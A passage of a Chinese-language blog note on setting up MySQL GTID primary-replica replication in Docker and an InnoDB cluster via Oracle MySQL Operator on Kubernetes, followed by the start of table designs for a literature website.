my.cnf<br><br><br>2. 配置这个 cnf # /data/mysql/mysql1/conf/my.cnf<br><br>[mysqld]                  # 表示接下来的配置都是用于 mysqld 服务端的<br><span class="hljs-attribute">server_id</span>=1               # 定义该 MySQL 实例的唯一 ID，用于区分主从之间的服务器，不可重复<br><span class="hljs-attribute">log-bin</span>=mysql-bin         # 启用二进制日志（binlog），并设置文件名前缀为 mysql-bin<br><span class="hljs-attribute">binlog_format</span>=ROW         # 设置 binlog 的格式为 ROW（行模式）<br><span class="hljs-attribute">gtid_mode</span>=ON              # 启用 **GTID（全局事务 ID）复制**。<br><span class="hljs-attribute">enforce_gtid_consistency</span>=ON   # - 启用 **GTID 一致性检查**，防止执行不兼容 GTID 的语句。必须在启用 GTID 模式之前设置为 ON，否则会报错。<br><br><br>[mysqld]<br><span class="hljs-attribute">server_id</span>=1<br><span class="hljs-attribute">log-bin</span>=mysql-bin<br><span class="hljs-attribute">binlog_format</span>=ROW<br><span class="hljs-attribute">gtid_mode</span>=ON<br><span class="hljs-attribute">enforce_gtid_consistency</span>=ON<br><br><br><br>[mysqld]<br><span class="hljs-attribute">server_id</span>=1  # 主库的 server_id 一般设为 1，唯一<br><span class="hljs-attribute">log_bin</span>=mysql-bin  # 启用 binlog 记录，binlog 用于记录主库的所有写操作<br><span class="hljs-attribute">binlog_format</span>=ROW  # 设置为 ROW 格式，保证数据一致性<br><span class="hljs-attribute">gtid_mode</span>=ON  # 启用 GTID 复制，确保事务的一致性<br><span class="hljs-attribute">enforce_gtid_consistency</span>=ON  # 强制 GTID 一致性<br><span class="hljs-attribute">log_slave_updates</span>=ON  # 启用从库写 binlog，防止级联复制中丢失数据<br><span class="hljs-attribute">read_only</span>=0  # 主库是可写的<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. server_id：</span><br><span class="hljs-string">1. 唯一标识一个 MySQL 实例，是 MySQL 复制系统中的“身份证”，如果两个节点 server_id 相同，复制就会失败</span><br><span class="hljs-string">2. 所有参与复制的实例（包括主库和所有从库）必须设置且唯一</span><br><span class="hljs-string">3. 通常主库设为 1，从库设为 2、3、4</span><br><span class="hljs-string">2. log_bin：</span><br><span class="hljs-string">1. 开启 binlog（二进制日志）并指定文件前缀。</span><br><span class="hljs-string">2. mysql-bin 是日志文件前缀，最终文件会像 mysql-bin.000001 这样。</span><br><span class="hljs-string">3. binlog_format：</span><br><span class="hljs-string">1. 用于设置 binlog 的记录格式，主要影响 DML 语句（如 INSERT、UPDATE、DELETE）的记录方式。可选值包括：</span><br><span class="hljs-string">2. ROW：</span><br><span class="hljs-string">1. 记录每一行数据修改前和修改后的值，主从复制时能最大程度地保证数据一致性</span><br><span class="hljs-string">2. 特别适用于包含触发器、函数、副作用操作的场景，主从一致性最强</span><br><span class="hljs-string">3. 缺点是 日志体积大（尤其批量更新时），且不记录原始 SQL，调试难度高</span><br><span class="hljs-string">3. STATEMENT：</span><br><span class="hljs-string">1. 只记录原始 SQL 语句，不记录执行结果或变更的具体值</span><br><span class="hljs-string">2. 优点是 体积小、写入快，效率高</span><br><span class="hljs-string">3. 缺点是依赖主从执行环境一致，若使用 NOW()、UUID() 等非确定性函数，可能导致主从数据不一致</span><br><span class="hljs-string">4. 比如 NOW() 是获取当前时间，你前后两次调用，虽然 SQL 语句一致，但是值不同。</span><br><span class="hljs-string">4. MIXED：</span><br><span class="hljs-string">1. MySQL 会根据 SQL 的内容自动选择 STATEMENT 或 ROW 模式。</span><br><span class="hljs-string">2. 通常优先使用 STATEMENT，但在检测到不安全语句（如含 UUID() 等非确定性函数）时自动切换为 ROW，兼顾效率与一致性</span><br><span class="hljs-string">5. 补充：</span><br><span class="hljs-string">1. 我们常见的约束、索引、视图等操作其实本质上都是 DDL，只是常常未单独列出。</span><br><span class="hljs-string">2. 不论使用哪种 binlog_format，DDL 和 DCL 操作都会以原始 SQL 语句事件的形式写入 binlog，binlog_format 的设置只影响 DML 语句的记录方式</span><br><span class="hljs-string">4. gtid_mode：</span><br><span class="hljs-string">1. 是否启用 GTID（全局事务 ID）复制机制，ON 是开启</span><br><span class="hljs-string">2. GTID 给每一个事务一个全局唯一的 ID，主从间按 ID 进行复制，推荐必开</span><br><span class="hljs-string">3. 注意事项：</span><br><span class="hljs-string">1. 启用前数据库中不能有非 GTID 事务，要确保环境干净</span><br><span class="hljs-string">5. enforce_gtid_consistency：</span><br><span class="hljs-string">1. 是否强制所有事务兼容 GTID，ON 是开启</span><br><span class="hljs-string">6. log_slave_updates：</span><br><span class="hljs-string">1. 让 “从库” 在执行主库的事务时，也写自己的 binlog，ON 是开启</span><br><span class="hljs-string">2. 这个选项一般在作为从库时才需要开启，如果实例只是单纯的主库，不同步别人的数据，那就用不上。但如果是双主架构（彼此做 “从库”），或者将来要做故障切换，那就必须打开它了。</span><br><span class="hljs-string">7. read_only：</span><br><span class="hljs-string">1. 是否只读，可选值：</span><br><span class="hljs-string">2. 0：读写</span><br><span class="hljs-string">3. 1：只读</span><br><span class="hljs-string">4. 注意事项：</span><br><span class="hljs-string">1. 我们在数据库层面保持 read_only 允许写入，而由 MyCat 统一管理读写分离策略，从而简化故障切换时的配置变更。</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><br>4.重启<br>docker restart &lt;container-id&gt; / &lt;container-name&gt;<br><br></code></pre></td></tr></table></figure></li></ol><blockquote><p>[!NOTE] 注意事项：<code>binlog_format</code>：</p><ol><li><code>STATEMENT</code>（语句模式）：记录执行的 SQL 语句；</li><li><code>MIXED</code>（混合模式）：智能切换；</li><li><code>ROW</code>：记录实际变化的每一行，推荐用于主从复制。精确记录每一行的变更，适用于主从数据一致性要求较高的场景。</li><li>gtid？</li></ol></blockquote><p>&#x3D;&#x3D;2.配从库文件&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. 在 /data/mysql/mysql1/conf 路径下创建 my.cnf<br><br><br>2. 配置这个 cnf # /data/mysql/mysql1/conf/my.cnf<br><br>[mysqld]<br><span class="hljs-attribute">server_id</span>=2  # 从库2的唯一标识，主库为1，其他从库可以递增<br><span class="hljs-attribute">relay_log</span>=relay-bin  # 从库的中继日志文件前缀，用于存储主库的操作记录<br><span class="hljs-attribute">read_only</span>=1  # 设置为只读，防止从库接受写入操作<br><span class="hljs-attribute">gtid_mode</span>=ON  # 启用 GTID（全局事务ID）复制模式，保证复制一致性<br><span class="hljs-attribute">enforce_gtid_consistency</span>=ON  # 强制 GTID 一致性，确保只有符合 GTID 规则的事务被执行<br><br><br>[mysqld]<br><span class="hljs-attribute">server_id</span>=2<br><span class="hljs-attribute">relay_log</span>=relay-bin<br><span class="hljs-attribute">gtid_mode</span>=ON<br><span class="hljs-attribute">enforce_gtid_consistency</span>=ON<br><br><br><br>4.重启<br>docker restart &lt;container-id&gt; / &lt;container-name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>对对对，当 MHA 动态修改只读，和修改旧主为只读，改 log 是relay 还是mysql</li><li></li><li>虽然mycat已经进行了读写分离，这里还用配置那么严格吗？（不严格，可以不用read_only&#x3D;1配置只读）</li></ol></blockquote><p>&#x3D;&#x3D;3.创建复制用户 repl 用户&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">这是mysl命令啊，你要登录mysql客户端，或者用datagrip 和 navicat 来运行命令<br><br><span class="hljs-comment">-- 创建一个用于主从复制的用户 repl，允许任意主机连接</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;repl&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> <br>  IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <br>  <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;wq666666&#x27;</span>;<br><br>repl：用户名<br>%：**允许从任意主机连接**（`%` 是通配符，匹配所有 IP 地址）<br>wq666666：用户密码<br><br><br><br><br><span class="hljs-comment">-- 授权该用户具有复制权限</span><br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">REPLICATION</span> SLAVE <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;repl&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><br><br><span class="hljs-comment">-- 刷新权限，使授权立即生效</span><br>FLUSH <span class="hljs-keyword">PRIVILEGES</span>;<br><br></code></pre></td></tr></table></figure><p>查看主库二进制位置（后面会用到）</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SHOW <span class="hljs-keyword">MASTER</span> <span class="hljs-title">STATUS</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250408141545381.png"><br>两个从节点可能相同，但是主节点不同，要注意了<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250408141924184.png"></p><p>从库执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs routeros">这是mysql 命令啊<br><br><br>CHANGE MASTER <span class="hljs-keyword">TO</span> <br>  <span class="hljs-attribute">MASTER_HOST</span>=<span class="hljs-string">&#x27;主库 IP 地址&#x27;</span>,  -- 主库的<span class="hljs-built_in"> IP </span>地址，确保从库能够连接到主库<br>  <span class="hljs-attribute">MASTER_USER</span>=<span class="hljs-string">&#x27;repl&#x27;</span>,  -- 用于复制的用户，通常是具有 REPLICATION SLAVE 权限的用户<br>  <span class="hljs-attribute">MASTER_PASSWORD</span>=<span class="hljs-string">&#x27;Repl@2025&#x27;</span>,  -- 复制用户的密码，确保与主库上的复制用户一致<br>  <span class="hljs-attribute">MASTER_LOG_FILE</span>=<span class="hljs-string">&#x27;主库的 binlog 文件名&#x27;</span>,  -- 主库的当前 binlog 文件名，通过 `SHOW MASTER STATUS` 获取<br>  <span class="hljs-attribute">MASTER_LOG_POS</span>=主库的 binlog 位置,  -- 主库的 binlog 位置，通过 `SHOW MASTER STATUS` 获取<br>  <span class="hljs-attribute">MASTER_AUTO_POSITION</span>=1;  -- 启用 GTID 复制模式，自动管理复制位置<br><br><br>CHANGE MASTER <span class="hljs-keyword">TO</span> <br>  <span class="hljs-attribute">MASTER_HOST</span>=<span class="hljs-string">&#x27;主库 IP 地址&#x27;</span>, <br>  <span class="hljs-attribute">MASTER_USER</span>=<span class="hljs-string">&#x27;repl&#x27;</span>, <br>  <span class="hljs-attribute">MASTER_PASSWORD</span>=<span class="hljs-string">&#x27;Repl@2025&#x27;</span>,<br>  <span class="hljs-attribute">MASTER_LOG_FILE</span>=<span class="hljs-string">&#x27;主库的 binlog 文件名&#x27;</span>, <br>  <span class="hljs-attribute">MASTER_LOG_POS</span>=主库的 binlog 位置,<br>  <span class="hljs-attribute">MASTER_AUTO_POSITION</span>=1;<br><br>最新版不用位置了，如果你使用 **GTID 复制**，只需要设置 `<span class="hljs-attribute">MASTER_AUTO_POSITION</span>=1`，而不需要手动指定 `MASTER_LOG_FILE` 和 `MASTER_LOG_POS`。<br>这是因为 `<span class="hljs-attribute">MASTER_AUTO_POSITION</span>=1` 启用了 GTID（全局事务标识符）模式，GTID 模式会自动管理复制位置，而无需手动指定 `binlog` 文件和位置。<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span> <br>  <span class="hljs-attribute">MASTER_HOST</span>=<span class="hljs-string">&#x27;192.168.136.8&#x27;</span>,<br>  <span class="hljs-attribute">MASTER_USER</span>=<span class="hljs-string">&#x27;repl&#x27;</span>,<br>  <span class="hljs-attribute">MASTER_PASSWORD</span>=<span class="hljs-string">&#x27;wq666666&#x27;</span>,<br>  <span class="hljs-attribute">MASTER_AUTO_POSITION</span>=1;<br><br><br><br><br>启动从库复制状态<br>START SLAVE;<br><br><br>检查从库复制状态<br>SHOW SLAVE STATUS;<br><br><br></code></pre></td></tr></table></figure><hr><h4 id="5-2-使用-Oracle-MySql-Operaotr-搭建-1-主-多从架构"><a href="#5-2-使用-Oracle-MySql-Operaotr-搭建-1-主-多从架构" class="headerlink" title="5.2. 使用 Oracle MySql Operaotr 搭建 1 主 多从架构"></a>5.2. 使用 Oracle MySql Operaotr 搭建 1 主 多从架构</h4><p>&#x3D;&#x3D;1.安装 MySQL Operator&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 部署 CRDs</span><br>kubectl apply -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/mysql/my</span>sql-operator<span class="hljs-regexp">/trunk/</span>deploy/deploy-crds.yaml<br><br><br><span class="hljs-comment"># 2. 部署 MySQL Operator</span><br>kubectl apply -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/mysql/my</span>sql-operator<span class="hljs-regexp">/trunk/</span>deploy/deploy-operator.yaml<br><br><br><span class="hljs-comment"># 3. 检查 Operaotr 部署状态</span><br>kubectl get deployment -n mysql-operator mysql-operator<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>Oracle MySQL Operator 的 GitHub 地址：<a href="https://github.com/mysql/mysql-operator">Oracle MySQL Operator 地址</a>，可以挑选版本或根据 README 进行安装</li><li>Oracle MySQL Operaotr 的安装脚本地址：<a href="https://github.com/operator-framework/operator-lifecycle-manager/releases">Oracle MySQL Operaotr 安装脚本地址</a></li></ol></blockquote><hr><p>&#x3D;&#x3D;2.为 MySQL root 用户创建 Opaque Secret&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 1. 对密码进行 Base64 编码</span><br>echo -n <span class="hljs-string">&quot;wq666666&quot;</span> | base64<br><br><br><br><br><span class="hljs-meta"># 2. 编写 Opaque Secret 资源 yaml </span><br><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> Secret<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> mysql-root-secret<br><span class="hljs-symbol">  namespace:</span> mysql-operator<br><span class="hljs-symbol">type:</span> Opaque<br><span class="hljs-symbol">data:</span><br><span class="hljs-symbol">  rootPassword:</span> xxxxxxx<br><br><br><span class="hljs-meta"># 3. 创建 Opaque Secret 资源</span><br>kubectl apply -f mysql-root-secret.yaml<br></code></pre></td></tr></table></figure><p>3.创建 InnoDBCluster 资源</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># mysql-primary.yaml 配置文件</span><br><span class="hljs-params">apiVersion:</span> mysql.oracle.com<span class="hljs-symbol">/v2</span>            <span class="hljs-comment"># 使用 MySQL Operator 的版本，指定使用 MySQL 2.x 版本</span><br><span class="hljs-params">kind:</span> InnoDBCluster                        <span class="hljs-comment"># 类型为 InnoDBCluster，表示这是一个 MySQL InnoDB 集群</span><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> mysql-cluster                      <span class="hljs-comment"># MySQL 集群的名称</span><br>  <span class="hljs-params">namespace:</span> mysql-cluster   <span class="hljs-comment"># 集群所在的命名空间，确保创建在正确的命名空间下</span><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">secretName:</span> mysql-root-secret  <span class="hljs-comment"># 引用 Kubernetes 中存储 MySQL root 用户密码的 Secret</span><br>  <span class="hljs-params">instances:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 集群中的实例数，1 主实例，2 从实例</span><br>  <span class="hljs-params">tlsUseSelfSigned:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 如果没有外部证书，则启用自签名证书（推荐用于开发和测试环境）</span><br>  <span class="hljs-params">podSpec:</span>  <span class="hljs-comment"># 为每个 Pod 定义资源和配置</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">cpu:</span> <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 每个 MySQL 实例请求的 CPU 资源</span><br>        <span class="hljs-params">memory:</span> <span class="hljs-string">&quot;2Gi&quot;</span>  <span class="hljs-comment"># 每个 MySQL 实例请求的内存资源</span><br>  <span class="hljs-params">volumeClaimTemplate:</span>  <span class="hljs-comment"># 定义存储卷的要求</span><br>    <span class="hljs-params">accessModes:</span> [<span class="hljs-string">&quot;ReadWriteOnce&quot;</span>]  <span class="hljs-comment"># 存储访问模式，表示每次只能由一个 Pod 进行读写</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">storage:</span> <span class="hljs-number">50</span>Gi  <span class="hljs-comment"># 每个实例请求的存储大小（50GB）</span><br><br><br><br><br><span class="hljs-params">apiVersion:</span> mysql.oracle.com<span class="hljs-symbol">/v2</span><br><span class="hljs-params">kind:</span> InnoDBCluster<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> mysql-primary<br>  <span class="hljs-params">namespace:</span> mysql-cluster<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">secretName:</span> mysql-root-secret<br>  <span class="hljs-params">instances:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">tlsUseSelfSigned:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">podSpec:</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">cpu:</span> <span class="hljs-string">&quot;1&quot;</span><br>        <span class="hljs-params">memory:</span> <span class="hljs-string">&quot;2Gi&quot;</span><br>  <span class="hljs-params">volumeClaimTemplate:</span><br>    <span class="hljs-params">accessModes:</span> [<span class="hljs-string">&quot;ReadWriteOnce&quot;</span>]<br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">storage:</span> <span class="hljs-number">50</span>Gi<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># mysql-primary.yaml</span><br><br><span class="hljs-params">apiVersion:</span> mysql.oracle.com<span class="hljs-symbol">/v2</span>  <span class="hljs-comment"># 使用 MySQL Operator 的 API 版本</span><br><span class="hljs-params">kind:</span> InnoDBCluster  <span class="hljs-comment"># 资源类型为 InnoDBCluster，表示一个 MySQL 集群</span><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> mysql-primary  <span class="hljs-comment"># 集群名称为 mysql-primary</span><br>  <span class="hljs-params">namespace:</span> mysql-cluster  <span class="hljs-comment"># 资源所在的 Kubernetes 命名空间</span><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">secretName:</span> mysql-root-secret  <span class="hljs-comment"># 指定存储 MySQL root 密码的 Secret 名称</span><br>  <span class="hljs-params">instances:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 设置集群中的实例数，这里有 1 个主节点和 2 个从节点</span><br>  <span class="hljs-params">tlsUseSelfSigned:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 如果没有外部证书，则启用自签名证书进行 TLS 加密通信</span><br>  <span class="hljs-params">podSpec:</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">cpu:</span> <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 请求的 CPU 资源为 1 核</span><br>        <span class="hljs-params">memory:</span> <span class="hljs-string">&quot;2Gi&quot;</span>  <span class="hljs-comment"># 请求的内存资源为 2Gi</span><br>  <span class="hljs-params">volumeClaimTemplate:</span><br>    <span class="hljs-params">accessModes:</span> [<span class="hljs-string">&quot;ReadWriteOnce&quot;</span>]  <span class="hljs-comment"># 存储访问模式，表示每个节点只能有一个读写访问</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">storage:</span> <span class="hljs-number">50</span>Gi  <span class="hljs-comment"># 每个 MySQL 实例请求 50Gi 的存储空间</span><br><br><br><br><br><span class="hljs-comment"># mysql-primary.yaml</span><br><br><span class="hljs-params">apiVersion:</span> mysql.oracle.com<span class="hljs-symbol">/v2</span><br><span class="hljs-params">kind:</span> InnoDBCluster<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> mysql-primary<br>  <span class="hljs-params">namespace:</span> mysql-cluster<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">secretName:</span> mysql-root-secret<br>  <span class="hljs-params">instances:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">tlsUseSelfSigned:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">podSpec:</span><br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">cpu:</span> <span class="hljs-string">&quot;1&quot;</span><br>        <span class="hljs-params">memory:</span> <span class="hljs-string">&quot;2Gi&quot;</span><br>  <span class="hljs-params">volumeClaimTemplate:</span><br>    <span class="hljs-params">accessModes:</span> [<span class="hljs-string">&quot;ReadWriteOnce&quot;</span>]<br>    <span class="hljs-params">resources:</span><br>      <span class="hljs-params">requests:</span><br>        <span class="hljs-params">storage:</span> <span class="hljs-number">50</span>Gi<br><br></code></pre></td></tr></table></figure><h3 id="数据表设计"><a href="#数据表设计" class="headerlink" title="数据表设计"></a>数据表设计</h3><p>以下是为文学网站设计的数据库表结构，基于需求分析和实体-属性图，包含五个核心数据表：Users（用户表）、Categories（版块表）、Moderators（版主授权表）、Articles（文章表）和 Comments（留言表）。每张表按照用户查询中提供的格式，列出 <strong>序号</strong>、<strong>数据项名称</strong>、<strong>数据类型</strong>、<strong>范围约束</strong>、<strong>关键数据项</strong> 和 <strong>含义</strong>，以确保数据一致性、完整性和高效查询。</p><hr><h4 id="1-Users（用户表）"><a href="#1-Users（用户表）" class="headerlink" title="1. Users（用户表）"></a>1. Users（用户表）</h4><p><strong>描述</strong>：存储用户信息，用于身份验证和权限管理。</p><table><thead><tr><th>序号</th><th>数据项名称</th><th>数据类型</th><th>范围约束</th><th>关键数据项</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>UserID</td><td>INT</td><td>无</td><td>是</td><td>用户表主键，自增</td></tr><tr><td>2</td><td>Username</td><td>VARCHAR(50)</td><td>非空，唯一</td><td>是</td><td>用户名，用于登录</td></tr><tr><td>3</td><td>Password</td><td>VARCHAR(255)</td><td>非空</td><td>否</td><td>用户密码（加密存储）</td></tr><tr><td>4</td><td>Email</td><td>VARCHAR(100)</td><td>非空，唯一</td><td>是</td><td>用户邮箱，用于联系</td></tr><tr><td>5</td><td>Role</td><td>ENUM</td><td>‘Member’, ‘Moderator’, ‘Admin’</td><td>否</td><td>用户角色</td></tr><tr><td>6</td><td>CreatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>用户注册时间</td></tr><tr><td>7</td><td>UpdatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>用户信息更新时间</td></tr></tbody></table><hr><h4 id="2-Categories（版块表）"><a href="#2-Categories（版块表）" class="headerlink" title="2. Categories（版块表）"></a>2. Categories（版块表）</h4><p><strong>描述</strong>：存储文章分类版块信息，如“茶余饭后”“风花雪月”。</p><table><thead><tr><th>序号</th><th>数据项名称</th><th>数据类型</th><th>范围约束</th><th>关键数据项</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>CategoryID</td><td>INT</td><td>无</td><td>是</td><td>版块表主键，自增</td></tr><tr><td>2</td><td>CategoryName</td><td>VARCHAR(50)</td><td>非空，唯一</td><td>是</td><td>版块名称</td></tr><tr><td>3</td><td>Description</td><td>TEXT</td><td>可为空</td><td>否</td><td>版块描述</td></tr><tr><td>4</td><td>CreatedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>版块创建时间</td></tr></tbody></table><hr><h4 id="3-Moderators（版主授权表）"><a href="#3-Moderators（版主授权表）" class="headerlink" title="3. Moderators（版主授权表）"></a>3. Moderators（版主授权表）</h4><p><strong>描述</strong>：记录版主对特定版块的管理权限。</p><table><thead><tr><th>序号</th><th>数据项名称</th><th>数据类型</th><th>范围约束</th><th>关键数据项</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>ModeratorID</td><td>INT</td><td>无</td><td>是</td><td>版主授权表主键，自增</td></tr><tr><td>2</td><td>UserID</td><td>INT</td><td>无</td><td>是</td><td>版主用户ID（外键，引用 Users.UserID）</td></tr><tr><td>3</td><td>CategoryID</td><td>INT</td><td>无</td><td>是</td><td>管理的版块ID（外键，引用 Categories.CategoryID）</td></tr><tr><td>4</td><td>AssignedAt</td><td>TIMESTAMP</td><td>无</td><td>否</td><td>授权时间</td></tr></tbody></table><hr><h4 id="4-Articles（文章表）"><a href="#4-Articles（文章表）" class="headerlink" title="4. Articles（文章表）"></a>4. 